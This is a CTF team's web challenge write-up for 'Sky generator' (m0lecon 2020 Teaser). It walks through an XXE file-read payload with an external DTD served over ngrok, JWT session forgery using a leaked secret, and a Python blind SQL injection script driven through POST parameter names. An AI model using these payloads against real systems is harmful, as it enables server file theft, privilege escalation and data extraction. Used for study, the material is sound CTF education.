<!DOCTYPE html>
<html lang="en">

	<head>
    <meta charset="utf-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1">
    
    <meta name="author" content="Alessandro Versari">

    <!-- The above 3 meta tags *must* come first in the head; any other head content must come *after* these tags -->
    <title>fibonhack | Sky generator</title>

    <link rel="stylesheet" href="/assets/css/style.css">
    <script src="/assets/js/main.js"></script>

    <link rel="shortcut icon" href="/assets/images/favicon.png">

    <script type="text/javascript" async src="https://cdnjs.cloudflare.com/ajax/libs/mathjax/2.7.1/MathJax.js?..."></script>

    <!-- Global site tag (gtag.js) - Google Analytics -->
    <script async src="https://www.googletagmanager.com/gtag/js?id=UA-167636907-1"></script>

    <script>
        window.dataLayer = window.dataLayer || [];
        function gtag(){dataLayer.push(arguments);}
        gtag('js', new Date());

        gtag('config', 'UA-167636907-1');
    </script>

</head>


		<body class="no-js bg-zinc-900 h-screen flex flex-col justify-between">

			<div>
    <nav class="w-full p-6 flex flex-col items-center justify-center my-3">

		<!-- make image 50% on desktop and 90% on mobile using tailwind tags -->
		<img class="w-2/5 md:w-1/4" src="/assets/images/fibonhack-transparent.png" alt="fibonhack"/>
 
    </nav>

    <nav class="md:py-6">
        <div class="mx-auto max-w-7xl px-2 sm:px-6 lg:px-8">
          <div class="hidden sm:block relative flex h-16 items-center justify-between">
            <div class="flex flex-1 items-center justify-center sm:items-stretch sm:justify-center">
              <div class="sm:ml-6">
                <div class="flex space-x-4">
                  
                  <!-- TODO check current page -->
                  
                  <a href="/" class="hover:border-1 border-zinc-600 hover:border-dashed hover:border-b px-3 py-2 text-xl  text-zinc-300 font-medium " >Home</a>
                  <a href="/resources" class="hover:border-1 border-zinc-600 hover:border-dashed hover:border-b px-3 py-2 text-xl  text-zinc-300 font-medium " >Resources</a>
                  <a href="/posts" class="hover:border-1 border-zinc-600 hover:border-dashed hover:border-b px-3 py-2 text-xl  text-zinc-300 font-medium " >Posts</a>
                  <a href="/writeups" class="hover:border-1 border-zinc-600 hover:border-dashed hover:border-b px-3 py-2 text-xl   text-zinc-300 font-medium " >Writeups</a>
                </div>
              </div>
            </div>
          </div>
        </div>
      
        <div class="sm:hidden" id="mobile-menu">
          <div class="space-y-1 px-2 pt-2 pb-3">
            <a href="/" 
               
              class="border-b border-dashed border-1 border-zinc-600 text-white block px-3 py-2 text-lg  text-zinc-300 font-medium "
            >
              Home
            </a>
            <a 
              href="/resources" 
               
              class="border-b border-dashed border-1 border-zinc-600 block px-3 py-2 text-lg  text-zinc-300 font-medium "
            >
              Resources
            </a>
            <a href="/posts" 
                
              class="border-b border-dashed border-1 border-zinc-600 block px-3 py-2 text-lg  text-zinc-300 font-medium "
            >
              Posts
            </a>
            <a href="/writeups" 
               
              class="border-b border-dashed border-1 border-zinc-600 block px-3 py-2 text-lg  text-zinc-300 font-medium "
            >
              Writeups
            </a>
          </div>
        </div>
    </nav>
    <nav class="flex flex-wrap mx-auto w-full container md:px-0 px-4 text-white text-lg">
        <span class="text-green-500">fibonhack@templeos</span>
        <p>:</p>
        <span class="text-blue-400">~/Sky generator</span>
        <p>$</p>
        <div class="ml-1 ">
            cat page.txt
        </div>
    </nav>
    
</div>
  
  	  
			<div class="
				 
				main
				prose prose-invert 
				!container w-full
				mb-auto px-4 mx-auto py-6
				text-zinc-300
				"
			>
				<div class="post">
  <article class="post-content">
  <div class="post">

  <header class="post-header" style="padding-bottom: 0.8em;">
    <p> 24 May 2020 </p>
    <h1 style="margin: -0.02em auto;"> Sky generator - m0lecon 2020 Teaser - web</h1>
    <div id="authors"> by
    
    
      
      <a href="/members/Maxpnl">Maxpnl</a>
      
    
    
    </div>
  </header>

  <article class="post-content">
  <h3 id="initial-foothold">Initial foothold</h3>
<p>The website allowed users to transform an xml to a png, containing a sort of constellation, I tried to read /etc/passwd through an xxe payload and it worked, I was a little bit stuck until another member of the team remembered me you can see directories contents, I then looked at /var/www and saw a few juicy php files, one of them was called config.php, the only problem was that a php file contains some characters (e.g. &lt;,  &gt;) which doesnâ€™t behave well with xml, therefore I started looking for a way to bypass this limitation, one of them was using CDATA, using it leads the xml parser to avoid trying to interpret the readen file as an xml entity, it sort of sanitizes the readen file. In order to use it I had to create an external dtd file, and serve it using ngrok, the final payload looked something like</p>

<p>(credits to https://dzone.com/articles/xml-external-entity-xxe-limitations)</p>

<p>ngrok.dtd</p>
<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>&lt;!ENTITY % file SYSTEM "file:///var/www/html/skygenerator/public/config.php"&gt;
&lt;!ENTITY % start "&lt;![CDATA["&gt;
&lt;!ENTITY % end "]]&gt;"&gt;
&lt;!ENTITY % all "&lt;!ENTITY fileContents '%start;%file;%end;'&gt;"&gt; 
</code></pre></div></div>

<p>template.xml</p>
<div class="language-xml highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cp">&lt;!DOCTYPE data [
 &lt;!ENTITY % dtd SYSTEM
 "http://ngrokendpoint/ngrok.dtd"&gt;</span>
 %dtd;
 %all;
]&gt;
<span class="nt">&lt;sky&gt;</span>
	<span class="nt">&lt;star</span> <span class="na">x=</span><span class="s">"10"</span> <span class="na">y=</span><span class="s">"10"</span><span class="nt">&gt;</span><span class="ni">&amp;fileContents;</span><span class="nt">&lt;/star&gt;</span>
<span class="nt">&lt;/sky&gt;</span>
</code></pre></div></div>

<p>after that I was able to read the config.php file, as well as any other php file without parsing errors.</p>

<h3 id="controlling-the-jwt-token">Controlling the jwt token</h3>
<p>The config.php file had the secret key for the jwt token verification and it was using this plugin to replace the default session handling with jwt https://github.com/byjg/jwt-session.</p>

<p>I took a look at the admin_dashboard.php as well, and it seemed like it was checking for the user role to decide whether a user can access it, this user role was stored inside the session, after seeing this the next steps are pretty straightforward, I installed that jwt session and created a little php script to set the user role inside the session to admin, using the same private key as the server. After that I had a jwt token that was valid for the challenge as well.</p>

<div class="language-php highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cp">&lt;?php</span>

<span class="k">include</span>  <span class="s2">"vendor/autoload.php"</span><span class="p">;</span>
<span class="nv">$sessionConfig</span> <span class="o">=</span> <span class="p">(</span><span class="k">new</span> <span class="err">\</span><span class="nf">ByJG\Session\SessionConfig</span><span class="p">(</span><span class="s2">"skygenerator"</span><span class="p">))</span>
<span class="o">-&gt;</span><span class="nf">withSecret</span><span class="p">(</span><span class="s2">"Vb8lckQX8LFPq45Exq5fy2TniLUplKGZXO2"</span><span class="p">)</span>
<span class="o">-&gt;</span><span class="nf">withTimeoutMinutes</span><span class="p">(</span><span class="mi">60</span><span class="p">);</span>
<span class="nv">$handler</span> <span class="o">=</span> <span class="k">new</span> <span class="err">\</span><span class="nf">ByJG\Session\JwtSession</span><span class="p">(</span><span class="nv">$sessionConfig</span><span class="p">);</span>
<span class="nb">session_set_save_handler</span><span class="p">(</span><span class="nv">$handler</span><span class="p">,</span> <span class="kc">true</span><span class="p">);</span>
<span class="nb">session_start</span><span class="p">();</span>
<span class="nv">$_SESSION</span><span class="p">[</span><span class="s2">"id"</span><span class="p">]</span> <span class="o">=</span> <span class="mi">1846</span><span class="p">;</span>
<span class="nv">$_SESSION</span><span class="p">[</span><span class="s2">"role"</span><span class="p">]</span> <span class="o">=</span> <span class="s2">"admin"</span><span class="p">;</span>
<span class="cp">?&gt;</span>
</code></pre></div></div>

<h3 id="sql-injection-in-admin-panel">SQL Injection in admin panel</h3>
<p>The admin dashboard had a sql injection problem, in addition to the user_id post param it added any extra post param inside the query, the problem is it was doing something like</p>

<div class="language-javascript highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nx">query</span> <span class="o">=</span> <span class="dl">"</span><span class="s2">SELECT ... user_id=:user_id</span><span class="dl">"</span><span class="p">;</span>
<span class="nx">foreach</span> <span class="p">(</span><span class="nx">$_POST</span> <span class="k">as</span> <span class="nx">$param</span><span class="p">){</span>
	<span class="nx">query</span> <span class="p">.</span><span class="o">=</span> <span class="dl">"</span><span class="s2"> AND $param=:param</span><span class="dl">"</span><span class="p">;</span>
<span class="p">}</span>
</code></pre></div></div>

<p>The problem with this code is that $param is not sanitized and it can contain any sql statement, the only problem was that spaces didnâ€™t behave well with the :param, the trick was to replace spaces with tabs (\t or %09 url encoded), then I just had to run a typical content-based blind sql injection on the name of the post parameter (not the value) and I got the flag</p>

<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kn">import</span> <span class="nn">requests</span>
<span class="k">def</span> <span class="nf">tryshit</span><span class="p">(</span><span class="n">query</span><span class="p">):</span>
    <span class="n">query</span> <span class="o">=</span> <span class="n">query</span><span class="p">.</span><span class="n">replace</span><span class="p">(</span><span class="s">" "</span><span class="p">,</span> <span class="s">"</span><span class="se">\t</span><span class="s">"</span><span class="p">)</span>
    <span class="n">r</span> <span class="o">=</span> <span class="n">requests</span><span class="p">.</span><span class="n">post</span><span class="p">(</span>
        <span class="s">"https://challs.m0lecon.it:8000/admin_dashboard"</span><span class="p">,</span>
        <span class="n">cookies</span><span class="o">=</span><span class="p">{</span><span class="s">"AUTH_BEARER_default"</span><span class="p">:</span> <span class="s">"generated jwt token"</span><span class="p">},</span>
        <span class="n">data</span><span class="o">=</span><span class="p">{</span><span class="s">"user_id"</span><span class="p">:</span> <span class="n">my_user_id</span><span class="p">,</span> <span class="n">query</span><span class="p">:</span> <span class="mi">15</span><span class="p">})</span>
    <span class="k">return</span> <span class="n">r</span><span class="p">.</span><span class="n">text</span>


<span class="kn">import</span> <span class="nn">string</span>

<span class="n">found</span> <span class="o">=</span> <span class="s">""</span>

<span class="k">while</span> <span class="nb">len</span><span class="p">(</span><span class="n">found</span><span class="p">)</span><span class="o">&lt;</span><span class="mi">100</span><span class="p">:</span>
    <span class="k">print</span><span class="p">(</span><span class="n">found</span><span class="p">)</span>
    <span class="k">for</span> <span class="n">x</span> <span class="ow">in</span> <span class="s">"abcdef"</span> <span class="o">+</span> <span class="n">string</span><span class="p">.</span><span class="n">digits</span><span class="p">:</span>
        <span class="n">dio</span> <span class="o">=</span> <span class="n">tryshit</span><span class="p">(</span><span class="s">"1=(SELECT 1 FROM flag WHERE hex(flag) LIKE '{}%') -- -"</span><span class="p">.</span><span class="nb">format</span><span class="p">(</span><span class="n">found</span><span class="o">+</span><span class="n">x</span><span class="p">))</span>
        <span class="k">if</span> <span class="s">"filesize()"</span> <span class="ow">in</span> <span class="n">dio</span><span class="p">:</span>
            <span class="n">found</span><span class="o">+=</span><span class="n">x</span>
            <span class="k">break</span>
</code></pre></div></div>

  </article>
</div>

  </article>

</div>

			</div>

	<nav class="
     
    flex flex-wrap mx-auto w-full md:px-0 px-4 text-white text-lg mb-6 
    container
    terminal
    "
>
    <span class="text-green-500">fibonhack@templeos</span>
    <p>:</p>
    <span class="text-blue-400">~/Sky generator</span>
    <p>$</p>
    <form class="terminal_form flex ml-1 relative">
        <input type="text" spellcheck="false" class="border-transparent focus:border-transparent focus:ring-0 w-full bg-transparent focus:outline-0 border-none">
    </form>
</nav>

<footer class="
         
        space-y-6 md:space-y-0 flex flex-col md:flex-row text-white justify-between 
        w-full py-12 px-6 space-y-6 border-t border-dashed border-1 border-zinc-600 items-center
    "
>

    <div class="flex-1 items-center">
        theme developed by <a class="underline" href="https://github.com/just-hms/">just-hms</a> 
    </div>

    <div class="space-x-4 flex items-center justify-center">
        <a class="text-zinc-600 hover:text-zinc-100" href="https://github.com/fibonhack">
            <svg class="w-8 h-8" xmlns="http://www.w3.org/2000/svg" fill="currentColor" viewBox="0 0 16 16">
    <path d="M8 0C3.58 0 0 3.58 0 8c0 3.54 2.29 6.53 5.47 7.59.4.07.55-.17.55-.38 0-.19-.01-.82-.01-1.49-2.01.37-2.53-.49-2.69-.94-.09-.23-.48-.94-.82-1.13-.28-.15-.68-.52-.01-.53.63-.01 1.08.58 1.23.82.72 1.21 1.87.87 2.33.66.07-.52.28-.87.51-1.07-1.78-.2-3.64-.89-3.64-3.95 0-.87.31-1.59.82-2.15-.08-.2-.36-1.02.08-2.12 0 0 .67-.21 2.2.82.64-.18 1.32-.27 2-.27.68 0 1.36.09 2 .27 1.53-1.04 2.2-.82 2.2-.82.44 1.1.16 1.92.08 2.12.51.56.82 1.27.82 2.15 0 3.07-1.87 3.75-3.65 3.95.29.25.54.73.54 1.48 0 1.07-.01 1.93-.01 2.2 0 .21.15.46.55.38A8.012 8.012 0 0 0 16 8c0-4.42-3.58-8-8-8z" />
</svg>
        </a>
    
        <a class="text-zinc-600 hover:text-blue-400" href="https://twitter.com/fibonhack">
            <svg class="w-8 h-8" xmlns="http://www.w3.org/2000/svg" fill="currentColor" viewBox="0 0 16 16">
    <path d="M5.026 15c6.038 0 9.341-5.003 9.341-9.334 0-.14 0-.282-.006-.422A6.685 6.685 0 0 0 16 3.542a6.658 6.658 0 0 1-1.889.518 3.301 3.301 0 0 0 1.447-1.817 6.533 6.533 0 0 1-2.087.793A3.286 3.286 0 0 0 7.875 6.03a9.325 9.325 0 0 1-6.767-3.429 3.289 3.289 0 0 0 1.018 4.382A3.323 3.323 0 0 1 .64 6.575v.045a3.288 3.288 0 0 0 2.632 3.218 3.203 3.203 0 0 1-.865.115 3.23 3.23 0 0 1-.614-.057 3.283 3.283 0 0 0 3.067 2.277A6.588 6.588 0 0 1 .78 13.58a6.32 6.32 0 0 1-.78-.045A9.344 9.344 0 0 0 5.026 15z"/>
</svg>
            
        </a>
    
        <a class="saturate-0 contrast-[.75] brightness-[.75] hover:brightness-100 hover:contrast-100 hover:saturate-[.40]" href="https://ctftime.org/team/117538">
            <svg class="w-auto h-8" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" version="1.1" x="0px" y="0px" viewBox="0 0 283.46 79.33" style="enable-background:new 0 0 283.46 79.33;" xml:space="preserve">
	<style type="text/css">
		.st0{fill:#E3000B;}
		.st1{fill:#FFFFFF;}
	</style>
	<g id="Layer_1">
		<polygon class="st0" points="0,79.52 154.36,79.52 283.46,79.52 283.46,0.19 0,0.19 33.23,40.29  "/>
		<polygon class="st1" points="61.92,57.92 80.47,57.92 80.47,51.68 74.06,51.68 74.06,51.68 69.3,51.68 69.3,27.9 74.06,27.9    74.06,27.9 80.47,27.9 80.47,21.02 61.92,21.02  "/>
		<polygon class="st1" points="86.32,28.11 91.6,28.11 91.6,57.92 98.98,57.92 98.98,28.11 104.25,28.11 104.25,21.02 86.32,21.02     "/>
		<polygon class="st1" points="110.3,57.63 117.69,57.63 117.69,42.88 126.9,42.88 126.9,37.15 117.69,37.15 117.69,27.9    129.02,27.9 129.02,21.02 110.3,20.73  "/>
		<polygon class="st1" points="182.79,25.34 188.33,25.34 188.33,57.92 192.76,57.92 192.76,25.34 198.29,25.34 198.29,21.02    182.79,21.02  "/>
		<rect x="203.31" y="21.02" class="st1" width="4.43" height="36.9"/>
		<polygon class="st1" points="224.16,34.52 218.89,21.02 214.52,21.02 214.52,57.92 218.89,57.92 218.89,31.78 224.16,45.06    229.43,31.78 229.43,57.92 233.81,57.92 233.81,21.02 229.43,21.02  "/>
		<polygon class="st1" points="244.77,53.6 244.77,41.58 252.15,41.58 252.15,37.26 244.77,37.26 244.77,25.34 256.88,25.34    258.04,21.02 240.34,21.02 240.34,57.92 257.85,57.92 256.69,53.6  "/>
		<path class="st1" d="M135.54,21.02v36.9h39.7v-36.9H135.54z M169.83,52.89h-28.87V26.05h28.87V52.89z"/>
		<polygon class="st1" points="153.91,39.38 147.8,45.48 151.83,49.05 161.24,39.65 145.16,23.57 138.1,23.57  "/>
	</g>
</svg>
        </a>
    </div>
    
</footer>

	</body>
</html>
